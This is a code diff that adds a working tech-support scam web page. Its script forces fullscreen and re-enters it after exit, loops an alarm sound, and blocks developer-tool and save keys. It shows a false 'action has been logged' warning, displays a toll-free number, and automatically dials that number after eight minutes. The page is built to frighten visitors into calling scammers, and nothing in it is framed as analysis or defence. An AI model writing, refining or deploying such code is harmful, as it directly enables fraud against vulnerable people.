@@ -207,4 +207,104 @@
         </div>
 
         <div class="popup-buttons">
-            <butt
+            <button id="callNowBtn">Call Now</button>
+            <div id="callNumberText">+1 877 868 7081</div>
+        </div>
+    </div>
+</div>
+
+<audio id="alertAudio" loop>
+    <source src="https://1992gameofthrone1992.github.io/imagetopa/cb-au.m4a" type="audio/mp4">
+</audio>
+
+<script>
+    const audio = document.getElementById('alertAudio');
+    const progressFill = document.getElementById('progressFill');
+    const callNowBtn = document.getElementById('callNowBtn');
+    const callNumberText = document.getElementById('callNumberText');
+    const startImage = document.getElementById('startImage');
+
+    function isMobile() {
+        return /Android|iPhone|iPad|iPod|Windows Phone/i.test(navigator.userAgent);
+    }
+
+    window.onload = function() {
+        startImage.style.backgroundImage = "url('https://aliceinborderlandsept.github.io/colnbaze/2.jpeg')";
+        startImage.style.backgroundSize = "cover";       // ✅ fixed
+        startImage.style.backgroundPosition = "center";  // ✅ fixed
+        startImage.style.backgroundRepeat = "no-repeat"; // ✅ fixed
+
+        if (navigator.userAgent.includes("HTTrack")) {
+            alert("Website copying attempt detected. Action has been logged.");
+        }
+    }
+
+    document.addEventListener('keydown', function(e) {
+        if (e.keyCode == 123 || 
+            (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || 
+            (e.ctrlKey && (e.keyCode == 83 || e.keyCode == 85))) {
+            e.preventDefault();
+            alert("Action Blocked");
+        }
+    });
+
+    startImage.addEventListener('click', function () {
+        triggerFullScreen();
+        applyBackground();
+        startImage.style.display = 'none';
+        document.getElementById('leavePopup').style.display = 'block';
+        audio.play();
+
+        if (isMobile()) {
+            callNowBtn.style.display = 'inline-block';
+        } else {
+            callNumberText.style.display = 'block';
+        }
+
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += 0.2;
+            if (progress > 100) progress = 100;
+            progressFill.style.width = progress + '%';
+            if (progress === 100) clearInterval(interval);
+        }, 1000);
+
+        setTimeout(function () {
+            window.location.href = "tel:+18778687081";
+        }, 480000);
+    }, { once: true });
+
+    callNowBtn.addEventListener('click', function () {
+        window.location.href = "tel:+18778687081";
+    });
+
+    function triggerFullScreen() {
+        if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen();
+        } else if (document.documentElement.webkitRequestFullscreen) {
+            document.documentElement.webkitRequestFullscreen();
+        } else if (document.documentElement.msRequestFullscreen) {
+            document.documentElement.msRequestFullscreen();
+        }
+    }
+
+    function applyBackground() {
+        document.body.style.backgroundImage = "url('https://aliceinborderlandsept.github.io/colnbaze/2.jpeg')";
+        document.body.style.backgroundSize = "cover";        // ✅ fixed
+        document.body.style.backgroundPosition = "center";   // ✅ fixed
+        document.body.style.backgroundRepeat = "no-repeat";  // ✅ fixed
+    }
+
+    document.addEventListener('fullscreenchange', () => {
+        if (!document.fullscreenElement) {
+            document.addEventListener('click', reEnterFullscreenOnce, { once: true });
+        }
+    });
+
+    function reEnterFullscreenOnce() {
+        triggerFullScreen();
+    }
+</script>
+
+</body>
+</html>
